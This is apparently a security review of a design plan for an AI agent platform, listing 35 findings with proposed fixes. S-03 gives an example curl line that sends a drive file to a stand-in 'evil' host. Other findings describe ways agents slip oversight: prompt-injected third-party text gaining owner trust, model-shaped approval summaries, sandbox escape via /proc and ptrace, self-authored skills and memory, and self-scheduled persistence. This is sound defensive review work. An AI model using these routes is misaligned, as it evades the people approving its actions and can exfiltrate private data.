# Security review — keeper agents planning set (epics 89–99), 2026-10-02

Lens: security/privacy/safety of the PLAN. Read-only. Paths: ARCH = `_bmad-output/planning-artifacts/architecture/architecture-keeper-2026-07-03/ARCHITECTURE-AGENTS.md`; E9x = `_bmad-output/planning-artifacts/epic-9x-*.md`; RES = `_bmad-output/planning-artifacts/research-agents-2026-10-02.md`; DEC = `docs/decisions.md`; COORD = `/tmp/agents-review-coordinator-decisions.md`.

## Blockers

**S-01 · blocker · consume-once does not survive crash + takeover (double execution).** ARCH:938 (AD-394), E93:146-147. The consumed marker is a line in the consuming host's *own* log chunk (`fsync`ed locally, committed on the 5 s settle, pushed later); the resume path "searches the merged log of every host" for it. Host A consumes at T, executes, crashes before push; B takes over at T+180 s, finds the decision in the room and no `consumed` line → executes again. NFR-117 ("consumed at most once across … takeovers", ARCH:1192) is claimed but the only shared ordered store (the homeserver) is not written before the effect. **Fix:** before executing, the consuming host sends `dev.keeper.agent.approval.consumed {id, epoch, host}` (or an `m.annotation` on the request event) and waits for the server's event id; the log line is the local mirror. Resume on any host checks the room first. 93.2 #2/#5 must add "A consumed, pushed nothing, crashed; B took over" with the decision still in the room.

**S-02 · blocker · author-based integrity turns third-party text into `owner` instructions.** ARCH:918 (AD-390: "`owner` integrity for files whose last author is a reader"), E89:453-471 (`label_drive_read`, `labels_follow_who_wrote_a_file`). Anything a person's own keeper syncs into `00-inbox/`, `70-comms/`, `recordings/` — email exports, shared files, chat logs — has a reader as last author and so is labelled `owner`. Dr Tola Grey's `TR` prompt reads the inbox (E91:383-385), writes cards whose body is that text, `DS` delegates the body as the brief → specialists act at `peer`/`owner` integrity with no raise and no approval. This is G3 §9 lesson 4 (RES:463) re-enabled. **Fix:** integrity has a zone floor declared in `_drive.toml` (`[integrity] untrusted = ["00-inbox/**","70-comms/**","recordings/**"]`, default for `00-inbox`/`70-comms`), OKF `sources` of external origin → `untrusted`, unknown author → `agent` (already), and the triage/dispatch workflows raise a card made from untrusted content to `untrusted` on its `agent.toml`.

**S-03 · blocker · a networked `run` mounts the drives read-only inside the same sandbox — the lethal trifecta in one process.** ARCH:1023 (AD-405: "`workspace/` read-write, the drives in scope read-only … network denied unless `network`"), E96:160-161 (b)(g), E96:128 (Q10: the approval "declassifies exactly the argv's bytes"). `curl -d @<drive>/10-notes/x.md evil` (or any script the sandbox can read) exfiltrates data the argv never shows; the declassification covers the wrong bytes. **Fix:** `network: true` ⇒ the sandbox mounts only `workspace/` (no drives, no `.keeper/`); the T3 card says so; the declassified object is the SHA-256 set of `workspace/` at consume time (a precondition). DW-398's per-host allow-list stays deferred.

**S-04 · blocker · the model provider is not a `Sink`, yet NFR-115 and D-34 claim it is proved.** ARCH:923 (AD-391 sink list has no provider), E92:140 (`Sink { Room, Delegation, DriveWrite, MemoryWrite, External }`), ARCH:1190 (NFR-115: "… model call, MCP server …"), DEC:1749 (D-34: "a model call"). The only control is static `local_only` (ARCH:841). Nixi is seeded with `drives = ["tgdrive","neuradrive"]` on a CLIProxyAPI bot (E91:370, :428); drive_search embeds the query at the provider (E95:516); a review layer's `bot` override can send session content to a second provider (E94:573). **Fix:** add `Sink::Model { host, local }`; `[[providers]]`/provider rows gain `readers` (default `*` for non-local), checked at `arm_turn`, at embed, and at `helper` with a lens `bot`; or amend D-34/NFR-115 to say explicitly that the configured provider is trusted with every label and why. Add the row to 92.6's exhaustive `Sink` match.

## Major

**S-05 · major · claim acquisition is not a compare-and-set; two takers can both "win".** ARCH:853 (AD-378: write `epoch+1`, read back, proceed if the event is its own), E90:129-131 (C9). Two hosts PUT the same state key within one RTT; each reads back its own event before the other's lands; both proceed with epoch N+1 and both write lines with the same epoch, which the reader fence cannot tell apart. 90.6 #9 records the ordering but does not force the window. **Fix:** after read-back, re-read after a settle (≥ 2× max RTT or one `/sync` round) and yield if the current claim is not yours; the fence key becomes (epoch, claim `event_id`) carried on every line; a reader that sees two `acquired` lines with one epoch marks the session conflicted and refuses to replay until a person resolves it.

**S-06 · major · R25's "TOFU on first verified decision, then pinned" contradicts the epics and is unsafe.** COORD:176 vs E90:314 ("when absent the user is 'not pinned yet' and is never trusted") and E93:175, :264 ("A pin is written into `agentd.toml` by a person, never by keeper"). An attacker who adds a device and resets cross-signing before the first decision is pinned forever under R25. **Fix:** withdraw the TOFU clause from R25; the epics' manual pin after fingerprint comparison is the rule.

**S-07 · major · the sandboxed child can read the parent's secrets through `/proc` and ptrace.** E96:160-162 (tests (e)(f) cover home and credential paths only), E96:118 (seccomp blocks `socket` only), E90:302-305 (`KEEPER_AGENTD_SECRET_*` env is the *first* resolution source), ARCH:629. Same uid: `/proc/<ppid>/environ`, `/proc/<pid>/mem`, `ptrace`, `process_vm_readv`, `pidfd_getfd`. **Fix:** landlock denies `/proc`; seccomp denies `ptrace`, `process_vm_*`, `kcmp`, `pidfd_getfd`, `perf_event_open`; agentd sets `PR_SET_DUMPABLE=0` and scrubs `KEEPER_AGENTD_SECRET_*` from its environment after reading; prefer `LoadCredential` over env in the documented order. macOS SBPL: `(deny process-info*)`, `(deny mach-lookup)` except what `/usr/bin/true` needs. Add tests (i) `/proc/<ppid>/environ` unreadable, (j) `ptrace(PTRACE_ATTACH, ppid)` fails.

**S-08 · major · `HOME` = `workspace/` lets the model configure the binaries it asked to run.** E96:167 ("`HOME` = the workspace"), E96:149 (exe hash binds `/usr/bin/git` only). A T1 `session_write` of `workspace/.gitconfig` (`core.sshCommand`, `credential.helper`, `core.hooksPath`), `.npmrc`, `.cargo/config.toml` changes what the approved argv does; repo hooks under `workspace/repo/.git/hooks` run on `git push` at T3/T4 with none of it in the digest. **Fix:** `HOME` = fresh empty tmp outside the workspace; `GIT_CONFIG_GLOBAL=/dev/null GIT_CONFIG_NOSYSTEM=1 GIT_TERMINAL_PROMPT=0`; `-c core.hooksPath=/dev/null` injected for `git`; dotfiles at the workspace root and `.git/hooks/*` are "code the session holds" → T4 with hashes in `exec_binding.operands`.

**S-09 · major · the main session's label never widens, so one relayed question or one web-reading child taints Nixi forever.** ARCH:918 (AD-390: "only narrows"), ARCH:863 (AD-380: `ask_human` relays into the proxy's DM as a `peer` line), ARCH:888 (the child's reply arrives as a `peer` line carrying the child's label), E94:407-416. After a gate ticket or a specialist's MCP web search, Nixi's permanent DM is `untrusted`; every send/spend/delete there needs approval until the end of time, or a builder quietly exempts the proxy — a laundering channel. **Fix:** decide now: (a) per-turn integrity for `main` sessions (the join resets at each `user` line of the person, readers still cumulative), or (b) relayed asks/replies enter the proxy's context by reference (a card the person reads; the model sees only `[question #id from <agent>, shown to you]`) — FIDES Hide, which DW-414 defers. Without one of these, AD-380 and AD-390 are incompatible in practice.

**S-10 · major · the approval `summary` and the lock-screen "first line of the payload" are decidable surfaces the model can shape.** ARCH:532 (`summary`), E98:148 (title `<agent> asks: <summary>`, body "the payload's first line"), E98:282 (UX-DR144 *Approve once* from the notification). A prompt-injected agent writes a reassuring summary; a multi-line argv or a long Paseo prompt shows one line; Face ID approves it. **Fix:** `summary` is composed by keeper from the tool and args (templates per tool), never model text; a notification offers *Approve once* only when the *entire* payload fits the body (argv ≤ N elements, no newline, no Paseo prompt), otherwise only *Open*; T4 never approves from a notification.

**S-11 · major · `scope: "session"` at T2 on a permanent `main` session is a durable rule outside Settings.** ARCH:547-548, E93:120. Nixi's DM lives for years; "Approve for this session" on a `drive_write` outside the session is an unbounded write grant that AD-158 (ARCH:31) says must be a grant edit. **Fix:** `session` scope expires with the shorter of 24 h or the session; `main` sessions offer `once` only; or the approval writes a visible grant row.

**S-12 · major · agent-authored skills land in `_skills/` on a private drive without a person.** E95:177-178 (Q5: "On a private drive, it is then applied"), ARCH:743 (skills index is slot 3 of every system prompt; `skill_view` loads bodies). A `skill_propose` from an `agent`-integrity session (not `untrusted`) becomes future instructions for every agent of the drive after only the agentskills validator and the threat regexes — self-modification that AD-362 (ARCH:738) forbids for the soul, and G3 §9 lesson 4 (RES:463). **Fix:** skill `create`/`patch` always needs a person's T2 approval (as on shared drives), or a skill carrying `metadata.keeper_proposal` is not offered until a person removes it (95.3 already defines "adopt").

**S-13 · major · an agent can promote its own words into core memory by repeating them.** E95:165-173 (Q4: recall = pending proposals with the same folded text; unique queries = distinct source sessions), ARCH:996 (AD-401). The agent writes a claim to its journal or a harvest note (`agent` integrity, not excluded), re-reads it in three later sessions on three days, proposes it each time → promoted with no `owner`-integrity evidence and no person. **Fix:** promotion on a private drive requires ≥ 1 contributing session whose relevant input was `owner`/`peer` integrity (the person said it or a person-authored file), else it goes to the review card; E95:174's "quicker route" already makes a tap cheap.

**S-14 · major · MCP tool tiers trust self-declared annotations.** E96:116 (Q4: `readOnlyHint: true` ⇒ T0 automatic), ARCH:1039 (AD-406). A server lying `readOnlyHint` (or compromised, or a `command` server with the host's full rights — E96:304, DW-396) gets model-chosen arguments executed with no person. The MCP spec itself calls hints untrusted. **Fix:** annotations lower a tier only for servers whose `[[mcp]]` entry sets `trust_annotations = true` (an explicit person's statement) or carries per-tool tier rows; default T3 for every tool of an unannotated-trust server; `command` servers never below T2.

**S-15 · major · `_drive.toml` `readers`/`owner` — the root of the label lattice — is a file every reader can edit.** ARCH:212-229, ARCH:841. On neuradrive any reader with push widens `readers` or reassigns `owner`; labels then permit sends to the added id and the mount rule compares against the forged set. Today both readers are trusted people; the design still roots the ACL in data the governed parties write. **Fix:** `agentd.toml` `[[drives]]` (and the desktop's device-local profile) pins `readers`/`owner`; a `_drive.toml` that differs makes the zone "hosts nothing, names the difference". The forge collaborator set is the real ACL and should be the operator's reference when pinning.

**S-16 · major · status/scope/tool-progress edits carry content into rooms whose membership was fixed at opening.** ARCH:661-662 (`status {title, detail}`, `scope {drives:[{id,title}], focus:{path,heading}}`), E90:480 ("Tool progress goes out as edits of the session's status anchor"), ARCH:1310 (Ambiguity 7 treats status as unlabelled "control metadata"). Observers are invited at the opening label (ARCH:646); when the session narrows (reads tgdrive) the answer is blocked by `check_sink(Room)` (E92:284) but status `detail` ("reading 10-notes/x.md"), titles and the scope event's titles/focus are not in the sink suite (E92:289). **Fix:** every status/scope edit passes `check_sink(Room)` with the current label; tool progress carries counts, never paths; when the label is narrower than the room's membership the host posts one fixed sentence and routes details to the requester's proxy DM. Add rows to 92.6 #1.

**S-17 · major · the session log is a durable, synced, git-committed copy of every secret the model happened to see.** ARCH:497 (`tool_result` "the result as the model received it"), ARCH:463-467 (blobs, LFS), RES:1828 (#46 PocketOS). An over-scoped token in a drive file, a Paseo/Peekaboo result, a screenshot OCR — logged, pushed to Forgejo, synced to the phone's mirror, kept in history (DW-359). The `hardcoded_secret` scan exists only for memory proposals (E95:224). **Fix:** run the threat scan on every `tool_result` and `assistant` body before logging; replace matches with `[REDACTED secret-like: sha256:…]`; state in D-31 that a session folder is as sensitive as the drive it reads.

**S-18 · major · screenshots and KVM frames are persisted as session artifacts in the drive.** ARCH:549-550 (`preview` "by path and SHA-256"), E96:242 (#4: "the screenshot as `preview` (path and SHA-256 in the session's `artifacts/`)"), E96:273. Whatever is on the Mac's screen — other people's messages, passwords in the clear — becomes an LFS object in git forever, synced to every device. **Fix:** previews live under `<zone>/.keeper/previews/<sha256>` (Tier-0, never committed) and travel only as the encrypted Matrix attachment the card already uses (ARCH:665); the record keeps the hash; a takeover that cannot find the preview re-checks against a fresh capture or refuses.

**S-19 · major · telemetry/PostHog is never mentioned; agent spans could ride the OTLP export.** `docs/egress.md:32` (PostHog: "OTLP diagnostic records/traces"), ARCH:1196 (NFR-121 lists homeserver/providers/MCP/KVM/push only). keeper-agent and the desktop host emit `tracing` in the same process as the exporter; tool args, paths and provider errors are span fields. **Fix:** NFR-121 adds "keeper-agent/agentd register no observability sink; the desktop's agent-host spans are excluded from OTLP export by target prefix, pinned by a test"; `check:agentd-lean` adds the PostHog/OTLP crates to its forbidden set.

**S-20 · major · the CLIProxyAPI terms-of-service risk is named and then assigned to nobody.** RES:1487 ("the Claude Code CLI disguise … the spoofing Anthropic says it acts against"), RES:1491, RES:1809 (#29: "Owner: 89.6 (its docs); the owner"), ARCH:791. The program then seeds *every* agent against that one endpoint (E91:370-374, :428, :440) and bakes its tailnet hostname into fixtures and docs. Enforcement without notice (RES:1486) takes down all agents at once. **Fix:** an explicit operator action before 91.5: the owner records which upstreams sit behind `:8452`, whether `disable-claude-cloak-mode` is set, and accepts the risk in `docs/agents.md`; `agents init` requires `--bot` with no default; fixtures use `KEEPER_OPENAI_SMOKE_BASE_URL`, never the literal host.

**S-21 · major · an agent may give itself persistence through `card_update(schedule:)`.** E92:169 (`card_update` sets `schedule`, `workflow`, `assignee`), ARCH:589 ("written by a person or a steward" — not enforced for specialists), RES:430 (the Paseo broker dropped `create_schedule` as "recurring injection"). A delegated specialist (T1 on its own card, raised to T2) sets `schedule: @daily` + `workflow:` → nightly unattended runs from one approval. **Fix:** `schedule:`/`workflow:` via `card_update` are T3 for every kind, `once` scope; a scheduled card whose `schedule` was last written by an agent user shows "scheduled by <agent>" and needs one person's tick before its first run.

**S-22 · major · on the desktop, the approving device and the agent host are one process.** E90:565 (the Mac hosts in-process), E93:95 (Q9: the pin is the signed-in person's own identity, read through the messenger in the same process), ARCH:943 (AD-395). A T4 decision from hesperia's keeper verifies a key the same process holds; "architecturally incapable" (RES:460) does not hold there. **Fix (cheap, keeps D-3):** a T4 decision must come from a device that is not the owning host's own process (the phone, or electra's session decided on the Mac); the card says why; record the residue in D-33.

**S-23 · major · a gate has no rate limit, so an outside peer can manufacture approval fatigue.** E99:168 (DW-416), E99:118 (concurrency only), RES:418, :462 (lesson 3). Each async ticket asks a person (E99:90, Q7); a hostile or buggy peer floods the DM with approval cards. **Fix:** per-peer token bucket in `[[gate]]` (`max_tickets_per_hour`, default 10), refused tickets answered `refused: busy`, and one coalesced card per peer per window.

## Minor

**S-24 · minor · `binding_digest` omits the record `id`, `session` and `agent`.** ARCH:546. Defence in depth: include them so a decision can never be re-paired with another record of identical action bytes.

**S-25 · minor · a scheduled card can run twice after a takeover.** E92:210 (`last_run` re-read "under the claim" from the synced card file). The new holder reads a stale `last_run` because A's commit never pushed. Record the window start in the claim content or the status anchor; treat a missing push as "ran, effect unknown".

**S-26 · minor · the sqlite-store passphrase sits beside the store under the same uid.** ARCH:633. Say plainly in `docs/agents.md` that the passphrase protects a stolen data dir only when the secrets dir is not stolen with it; prefer `LoadCredential` for it.

**S-27 · minor · the proxy invited for `ask_human` stays a member and keeps decrypting the room.** ARCH:811, E94:409. Nixi's copy receives the whole specialist room thereafter. Leave the room after the relay (or invite with a one-shot membership and `leave` on `reply`).

**S-28 · minor · "any one reader decides" on shared sessions includes T4 actions on another person's resources.** E93:88 (Q2), E93:224 (DW-379). At T4 require the requester in the `dispatch_chain` to be the decider; leave the quorum deferred.

**S-29 · minor · Paseo's `readers` makes `create_agent` pass `check_sink` even though the PR's audience is the repository's.** E96:110 (Q1), ARCH:1048. Default `role = "paseo"` servers to `readers = ["*"]` so the T3 card is explicitly a declassification of the prompt.

**S-30 · minor · agentd releases are verified by sha256, not signature.** E90:452 (modelled on syncd, `.sha256` sidecar), `docs/egress.md:49-52`. agentd holds every agent's Matrix session and the drives' write tokens; sign it with the app's minisign key.

**S-31 · minor · `Keeper-Device` trailer and OKF `verified[]` are author evidence any pusher can write.** ARCH:918, E95:159-162. Within readers this is acceptable; document that integrity `owner` means "committed by a reader's keeper", not "written by that person".

**S-32 · minor · harvested notes have no size cap at review time.** ARCH:1018, E95:585-596. A 22 MB padded note (RES:414) defeats a human review; cap `artifacts/knowledge/**` at 64 KiB and show the whole note in the panel (no truncation, or refuse).

**S-33 · minor · `dev.keeper.agent.host` publishes provider base URLs in cleartext state.** ARCH:681 (`bots: ["bot:…"]`). Publish provider *ids*, not `bot:{kind}:{base}#{target}` references, or accept and record it under Ambiguity 7.

**S-34 · minor · the secrets directory check is per file.** E90:302-305, ARCH:629-631. Also require the directory to be `0700`, owned by the uid, not a symlink; refuse a symlinked secret file.

**S-35 · minor · consolidation's "a person's edit is never clobbered" relies on round-trip drift, not a lock.** E95:374-377. Fine as stated; add that the guard compares the git blob id, not bytes read through a possibly-stale checkout.
